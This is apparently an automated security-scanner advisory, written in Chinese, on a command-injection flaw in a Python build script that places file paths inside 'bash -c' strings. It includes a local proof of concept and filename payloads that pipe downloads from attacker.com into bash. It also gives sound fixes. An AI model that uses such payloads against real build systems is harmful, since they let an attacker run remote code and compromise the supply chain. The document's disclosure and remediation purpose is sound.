# VULN-007：build脚本命令注入漏洞

## 漏洞概要

| 属性 | 值 |
|-----------|-------|
| **ID** | VULN-007 |
| **类型** | 命令注入 |
| **CWE** | CWE-78 (操作系统命令注入) |
| **严重级别** | 严重 (Critical) |
| **置信度** | 95% |
| **文件** | `scripts/util/build_opp_kernel_static.py` |
| **行号** | 36-42, 91-107, 123-137 |
| **函数** | `shell_exec`, `compile_link_single`, `compile_ops_part_o` |
| **状态** | 已确认 |

## 漏洞描述

`shell_exec` 函数及其调用者使用 `subprocess.Popen` 并设置 `shell=False` 参数，这通常被认为是安全的。然而，命令被包装为 `bash -c "..."` 并使用 **f-string插值** 将文件路径直接注入到shell命令字符串中。这完全绕过了 `shell=False` 所意图的保护，允许通过文件路径变量注入shell元字符。

### 漏洞代码模式

```python
# 第36-42行：shell_exec 函数
def shell_exec(cmd, shell=False):
    try:
        ps = subprocess.Popen(cmd, shell)
        ps.communicate(timeout=180)
    except BaseException as e:
        log.error(f"shell_exec error: {e}")
        sys.exit(1)
```

```python
# 第91-97行：compile_link_single - 漏洞
def compile_link_single(self, file_path, file_o):
    (dir_path, file_name) = os.path.split(file_path)
    if self.cpu_arch == Const.x86:
        shell_exec(["bash", "-c", f"cd {dir_path} && "
                                  f"objcopy --input-target binary --output-target elf64-x86-64 "
                                  f"--binary-architecture i386 "
                                  f"{file_name} {file_o}"], shell=False)
```

```python
# 第123-136行：compile_ops_part_o - 漏洞
def compile_ops_part_o(self, out_path):
    # ...
    if self.cpu_arch == Const.x86 or (self.cpu_arch == Const.arm and platform.machine() != Const.x86):
        shell_exec(["bash", "-c", f"cd {out_path} && "
                                  f"ld -r {path_data_o} -o {path_part_o}"], shell=False)
```

## 数据流分析

```
sys.argv (命令行参数)
    ↓
args.build_dir (用户从 -b/--build_dir 控制)
    ↓
GenOpResourceIni(args.soc_version, args.build_dir).analyze_ops_files()
    ↓
self._binary_path = self._build_dir / "binary" / self._soc_version / "bin"
    ↓
通过json解析和Path.iterdir()枚举文件
    ↓
self._op_res[ops].kernel_files.extend(sorted(Path(ops_path).iterdir()))
    ↓
compile_link_o(op_out_path, file.resolve())
    ↓
compile_link_single(file_path, path_o_prefix)
    ↓
(dir_path, file_name) = os.path.split(file_path)  # 攻击者控制的文件名
    ↓
shell_exec(["bash", "-c", f"cd {dir_path} && objcopy ... {file_name} {file_o}"], shell=False)
    ↓
BASH执行注入的命令
```

## 攻击向量

### 1. 恶意文件名注入（主要攻击向量）

**前置条件**：攻击者必须能够在构建目录结构中创建或影响文件。

**攻击场景**：
1. 攻击者获得对 `binary/<soc_version>/bin/` 目录的写访问权限（如通过被攻陷的依赖、恶意PR或供应链攻击）
2. 攻击者创建具有恶意名称的文件：
   ```bash
   # 包含命令注入载荷的文件名
   touch '/build/binary/ascend910b/bin/kernel.o; curl http://attacker.com/exfil.sh | bash; #.o'
   ```
3. 构建运行时：
   ```bash
   python3 build_opp_kernel_static.py StaticCompile -s ascend910b -b /build -n=0 -a=x86_64
   ```
4. f-string插值产生：
   ```bash
   bash -c "cd /build/binary/ascend910b/bin && objcopy --input-target binary ... kernel.o; curl http://attacker.com/exfil.sh | bash; #.o output.o"
   ```
5. **结果**：构建服务器上的远程代码执行

### 2. 构建路径注入

**前置条件**：攻击者直接或通过环境变量控制 `--build_dir` 参数。

**通过build.sh攻击**：
```bash
# build.sh 直接传递 BUILD_PATH
BUILD_PATH="/tmp/$(curl attacker.com/malicious_path)"
python3 build_opp_kernel_static.py StaticCompile -s ascend910b -b ${BUILD_PATH} ...
```

### 3. Zip Slip / 路径遍历组合

如果文件从归档（tar、zip）提取而未进行适当的路径验证：
```python
# 攻击者控制的归档包含恶意文件名
# archive.tar 包含： "../../../bin/$(malicious_command).o"
```

## 利用概念验证

### 本地PoC

```bash
# 1. 导航到项目
cd /home/pwn20tty/Desktop/opencode_project/cann/1/ops-math

# 2. 在构建结构中创建恶意文件名
mkdir -p build/binary/ascend910b/bin/config/ascend910b
# 包含shell元字符的文件名
touch 'build/binary/ascend910b/bin/kernel$(id > /tmp/pwned).o'

# 3. 创建最小JSON配置以触发漏洞代码路径
cat > build/binary/ascend910b/bin/config/ascend910b/test.json << 'EOF'
{
  "binList": [{
    "binInfo": {"jsonFilePath": "test.json"},
    "simplifiedKey": ["test_op/params"]
  }]
}
EOF

# 4. 运行漏洞脚本
python3 scripts/util/build_opp_kernel_static.py StaticCompile \
    -s ascend910b \
    -b build \
    -n 0 \
    -a x86_64

# 5. 检查利用结果
cat /tmp/pwned  # 如果漏洞存在，此文件将包含uid/gid信息
```

### 远程攻击向量（供应链）

```python
# 恶意上游仓库包含：
# 文件：binary/ascend910b/bin/kernel.o$(curl attacker.com/backdoor.sh | sh)

# 当受害者克隆并构建：
git clone https://github.com/attacker/ops-math.git
cd ops-math
./build.sh  # 构建过程中的RCE
```

## 受影响代码位置

| 位置 | 行号 | 漏洞 | 风险级别 |
|----------|-------|---------------|------------|
| `shell_exec` | 36-42 | 将命令传递给bash -c而无清理 | 中 |
| `compile_link_single` (x86) | 93-97 | 注入 `{dir_path}`, `{file_name}`, `{file_o}` | 严重 |
| `compile_link_single` (arm native) | 99-102 | 注入 `{dir_path}`, `{file_name}`, `{file_o}` | 严重 |
| `compile_link_single` (arm cross) | 104-107 | 注入 `{dir_path}`, `{file_name}`, `{file_o}` | 严重 |
| `compile_ops_part_o` (x86/arm) | 132-133 | 注入 `{out_path}`, `{path_data_o}`, `{path_part_o}` | 严重 |
| `compile_ops_part_o` (arm cross) | 135-136 | 注入 `{out_path}`, `{path_data_o}`, `{path_part_o}` | 严重 |

## 攻击复杂度评估

| 因素 | 评级 | 理由 |
|--------|--------|-----------|
| **所需访问** | 低 | 对构建目录的写访问（CI/CD中常见） |
| **复杂度** | 低 | 简单的文件命名攻击 |
| **所需权限** | 低 | 标准构建用户权限 |
| **用户交互** | 无 | 构建过程中自动 |
| **范围** | 已改变 | 可影响构建服务器和下游系统 |
| **影响** | 严重 | 构建基础设施上的完全RCE |

**CVSS 3.1基础评分：8.8（高）**
- 攻击向量：本地（可通过供应链提升为网络）
- 攻击复杂度：低
- 所需权限：低
- 用户交互：无
- 范围：已改变
- 机密性：高
- 完整性：高
- 可用性：高

## 现实世界影响

### 1. 构建服务器入侵
- 构建服务器通常有访问生产凭证的权限
- 构建服务器上的RCE = 可能访问部署管道
- 可向编译产物注入后门

### 2. 供应链攻击
- 如果攻击者可通过PR或被攻陷依赖提交恶意文件名
- 所有从源码构建的用户都会被入侵
- 难以检测（文件名可能看起来合法）

### 3. CI/CD管道入侵
- GitHub Actions、Jenkins、GitLab CI都执行构建
- 仓库中的恶意文件名 = 立即CI/CD入侵
- 可窃取秘密、向产物注入恶意代码

## 推荐修复

### 1. 使用shlex.quote()清理路径

```python
import shlex

def compile_link_single(self, file_path, file_o):
    (dir_path, file_name) = os.path.split(file_path)
    # 转义shell元字符
    safe_dir = shlex.quote(dir_path)
    safe_file = shlex.quote(file_name)
    safe_o = shlex.quote(file_o)
    
    if self.cpu_arch == Const.x86:
        shell_exec(["bash", "-c", f"cd {safe_dir} && "
                                  f"objcopy --input-target binary --output-target elf64-x86-64 "
                                  f"--binary-architecture i386 "
                                  f"{safe_file} {safe_o}"], shell=False)
```

### 2. 更好：完全避免Shell包装

```python
import subprocess

def compile_link_single(self, file_path, file_o):
    (dir_path, file_name) = os.path.split(file_path)
    
    if self.cpu_arch == Const.x86:
        subprocess.run(
            ["objcopy", "--input-target", "binary", 
                        "--output-target", "elf64-x86-64",
                        "--binary-architecture", "i386",
                        file_name, file_o],
            cwd=dir_path,  # 使用cwd参数替代cd
            check=True,
            timeout=180
        )
```

### 3. 输入验证

```python
import re

def validate_path_component(component):
    """验证路径组件仅包含安全字符"""
    if not re.match(r'^[a-zA-Z0-9_\-\.]+$', component):
        raise ValueError(f"Invalid path component: {component}")
    return component
```

## 验证状态

**已确认为真实漏洞**

这不是误报。使用 `bash -c` 与文件路径的f-string插值提供了shell元字符的直接注入向量，完全绕过了 `shell=False` 保护。

## 参考资料

- [CWE-78: 操作系统命令中特殊元素的不当消除（操作系统命令注入）](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP命令注入](https://owasp.org/www-community/attacks/Command_Injection)
- [Python subprocess: shell=True vs shell=False](https://docs.python.org/3/library/subprocess.html#security-considerations)

---
*由OpenCode安全扫描器生成 - 详细工作代理*
*分析日期：2026-04-21*